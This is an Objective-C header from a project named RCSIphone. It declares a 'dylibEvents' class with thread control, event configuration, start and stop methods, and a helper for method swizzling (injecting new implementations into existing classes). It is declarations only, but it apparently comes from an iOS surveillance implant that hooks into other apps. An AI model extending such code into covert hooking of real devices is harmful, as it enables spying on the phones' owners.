//
//  RCSIDylibEvents.h
//  RCSIphone
//
//  Created by kiodo on 14/06/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//

#import <Foundation/Foundation.h>

#import "RCSICommon.h"
#import "RCSIThreadSupport.h"

@interface dylibEvents : NSObject
{
  _i_Thread  *mThread;
  NSData      *mEventConfiguration;
  u_int       mEventStatus;
  u_int       mEventID;
}
@property (retain, readwrite) NSData *mEventConfiguration;
@property (readwrite)         u_int   mEventID;
@property (readwrite, retain) _i_Thread *mThread;

- (id)init;
- (id)initWithConfigData:(NSData*)aData;
- (void)dealloc;

- (u_int)mEventStatus;
- (u_int)setMEventStatus:(u_int)aStatus;

- (BOOL)isThreadCancelled;
- (void)cancelThread;

- (BOOL)swizzleByAddingIMP:(Class)aClass 
                   withSEL:(SEL)originalSEL
            implementation:(IMP)newImplementation
              andNewMethod:(SEL)newMethod;

- (BOOL)start;
- (void)stop;

@end
